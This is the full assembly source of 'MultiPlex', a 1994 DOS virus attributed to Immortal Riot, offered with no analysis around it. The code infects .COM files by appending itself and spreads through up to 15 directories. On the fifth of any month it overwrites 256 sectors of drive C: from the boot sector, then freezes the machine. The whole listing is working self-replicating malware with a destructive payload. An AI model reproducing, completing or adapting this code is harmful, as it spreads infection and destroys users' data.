; Virusname: MultiPlex
; Alias(es): None
; Origin   : Sweden
; Author   : Metal Militia/Immortal Riot
;
; Thisone's a non-res/non-ow/non-encrypted infector of .COM files which
; travels thrue one directory on your harddrive each time an infected
; file's executed.
;
; I'ts damage routine will be activated if the date's equal to the fifth
; of any month. If so, it does an good 'ol 256 which does it's dirty
; work just as good as MULTI-FLU's 9999.
;

                code segment
                assume cs:code,ds:code,es:code

                org 0100h

start_o_virus:  mov si,0  ; sub/xor si,si
                jmp mejntwo ; jump there
                db  'IR'

lengthovir      equ offset tag+5-offset mejntwo ; Length of virus

mejntwo:        call nextline ; prepear to put ax in si (no 'BP' here)
nextline:       pop ax                 ; Pop 'em
                sub ax,offset nextline ; and offset
                call xchg_it           ; Now, exchange
mejnthree:      call restore_one       ; Restore the
                call restore_two       ; first original bytes

getdir:         mov ah,47h             ; Get (current) directory
                mov dl,00h             ; to restore it later
                push si                ; Now, push it
                lea bx,(origindir+si)  ; and offset the
                mov si,bx              ; place to save it in
                int 21h
                jc lexit               ; If there's an error, exit

                pop si                        ; Pop it
                mov byte ptr ds:[rock+si],00h ; and set 'rock' to zero

setdta:         mov ah,1ah                    ; Now, set the DTA (needed
                lea dx,(buffa+si)             ; to be able to execute
                int 21h                       ; programs with 'choices')

findfile:       lea dx,(searchein+si)         ; What files to search for
                call find_first               ; Find first '*.com'
                jnc openup                    ; If no error, infect

                cmp al,12h                    ; Was there no files left?
                jne lexit                     ; If not, outa here!!!!!
                jmp next_dir                  ; Move to the next dir

lexit:          jmp exit                      ; long exit jumps to small


openup:         mov ah,3dh                    ; Open the file
                mov al,02h
                lea dx,(buffa+1eh+si)
                int 21h
                jc lexit
                mov ds:[handle+si],ax

movepoint:      mov ah,42h                   ; mov ax,4202h
                mov al,02h                   ; (move to end of file)
                call bx_ds                   ; handle stuff
                mov cx,cxequals
                mov dx,dxequals
                int 21h
                jc lclose                    ; was there an error?
                jmp checkmark                ; if not, continue

lclose:         jmp close                    ; long close to short close

checkmark:      mov ah,3fh                   ; read in the first
                call bx_ds
                call cx_em                   ; see if already infected
                lea dx,(firsties+si)         ; so we read in the first
                int 21h                      ; bytes to our buffa
                jc lclose
                lea di,(tag+si)              ; read in our tag
                lea ax,(firsties+si)         ; does it match?
                call xchg_it
                call cx_em
compare:        cmpsb
                jnz infect                   ; if so, then
                loop compare                 ; just go ahead
                call xchg_it                 ; to hunt down
                jmp next_file                ; the next file


infect:         call xchg_it
                mov ah,42h                   ; move to start of file
                mov al,00h
                call bx_ds
                sub cx,cx                    ; mov cx,0 xor cx,cx
                cwd                          ; xor dx,dx sub dx,dx
                int 21h
                jc lclose
                mov ah,3fh                   ; this time, read in
                call bx_ds
                lea dx,(oldstart+si)         ; (saving in 'oldstart')
                call cx_four                 ; the first four bytes
                int 21h
                jc lclose
                mov ah,42h                   ; now, move to end of file
                mov al,02h
                call bx_ds
                sub cx,cx                    ; xor cx,cx etc. etc.
                cwd                          ; xor dx,dx etc. etc.
                int 21h
                jc lclose
                sub ax,3h
                mov word ptr ds:[jump+1+si],ax
                call write_us                ; call to write our code
                mov ah,42h                   ; move to start of file
                mov al,00h
                call bx_ds
                sub cx,cx
                cwd
                int 21h
                call write_em                ; write to file
                call bx_ds
                call cx_three                ; 3 bytes
                lea dx,(jump+si)             ; our own 'JMP'
                int 21h
                call change_dir              ; change directory
                lea dx,(rootoz+si)          ; to root
                int 21h


                jmp close                    ; now, close the file

next_dir:       cmp ds:[diroz],15            ; are we thrue with atleast
                je exit                      ; 15 directories yet? exit!
                mov ah,1ah                   ; Set the DTA to our
                lea dx,(buffatwo+si)         ; second '60 dup (0)' buffa
                int 21h
                call change_dir                ; Change directory
                call root_dir                  ; to the root
                cmp byte ptr ds:[rock+si],00h  ; Is 'rock' still zero?
                jne nextdir2                   ; If not, get next 'DIR'
                mov byte ptr ds:[rock+si],0ffh ; Now set the 'flag'
                lea dx,(searchzwei+si)         ; and start to look for
                sub cx,cx                      ; dir's instead
                mov bx,cx
                mov cl,10h
                call find_first                ; find first of 'em
                jc exit                        ; error? outa here!
                jmp chdir                      ; otherwise, get that DIR

nextdir2:       call find_next                 ; find next DIR
                jc exit                        ; error, none left? exit!

                inc ds:[diroz+si]              ; increase the flag to
                                               ; tell we've found a DIR.
chdir:          call change_dir                ; change to that DIR
                lea dx,(buffatwo+1eh+si)       ; we've just found
                int 21h
                jmp setdta                     ; now, set the DTA again

close:          call close_em                  ; close everything
                 
runold:         mov  ah,2ah                    ; date date
                int  21h
                cmp  dl,5                      ; fifth of any month?
                jne  mov_jmp                   ; if not, outa here
                mov  al,2                      ; C:
                mov  cx,256                    ; 256
                cwd                            ; starting w/the boot
                int  26h                       ; direct diskwrite
                jmp  $                         ; hang computer

mov_jmp:
                mov ax,0100h                   ; and run the org. proggy
                jmp ax

next_file:      call close_em                  ; call to close the file

                call find_next                 ; call to find next file
                jc next_dir                    ; if none found, change
                                               ; directory
                jmp openup                     ; else, open and infect

exit:           mov ah,3bh ;call change_dir
                lea dx,(origindir+si) ; offset 'current'
                int 21h
                jmp runold ; and run the org. proggy

oldstart:       mov ah,4ch
                int 21h

jump            db 0e9h,0,0      ; our 'jmp'
virusname       db ' MULTiPLEX '
rock            db 00h
c_author        db '(c) 1994 Metal Militia'
rootdiroz       db '\',00h
grouporigin     db 'Immortal Riot, Sweden'
searchzwei      db '*. ',00h
greetings       db 'Somewhere, somehow, always :)'
searchein       db '*.com',00h

write_us:       call write_em        ; write to file
                call bx_ds
                mov cx,lengthovir    ; our viruscode
                lea dx,(mejntwo+si)
                int 21h
                ret

handle          dw 0h

close_em:       mov ah,3eh ; close file
                call bx_ds
                int 21h
                ret

origindir       db 64 dup (0) ; buffer where we save our original dir.

change_dir:     mov ah,3bh ; change dir
                ret

root_dir:       lea dx,(rootdiroz+si) ; when changing to the 'root'
                int 21h
                ret

find_first:
                mov ah,4eh ; find first file
                jmp int_em

restore_two:
                mov ds:[0100h],ax ; restore old first
                mov ds:[0102h],cx ; 2/2
                ret
int_em:
                int 21h
                ret

buffa           db  60h dup (0)

xchg_it:        xchg si,ax
                ret

buffatwo        db  60h dup (0)

find_next:
                mov ah,4fh ; find next file
                jmp int_em

firsties        db 5 dup (?) ; Buffer for the first five org. bytes

bx_ds:
                mov bx,ds:[handle+si]
                ret

write_em:       mov ah,40h ; Write to file
                ret

cx_em:          mov cx,05h
                ret

diroz           dw 0h

cx_three:       mov cx,3
                ret

cx_four:        mov cx,4
                ret

restore_one:    mov ax,word ptr ds:[oldstart+si]   ; restore old first
                mov cx,word ptr ds:[oldstart+si+2] ; 1/2
                ret

tag             db 'ImRio' ; My lil' DIGITAL GRAFITTI

rootoz          db '\' ; when changing to root

cxequals        equ 0ffffh
dxequals        equ 0fffbh

code ends
     end start_o_virus
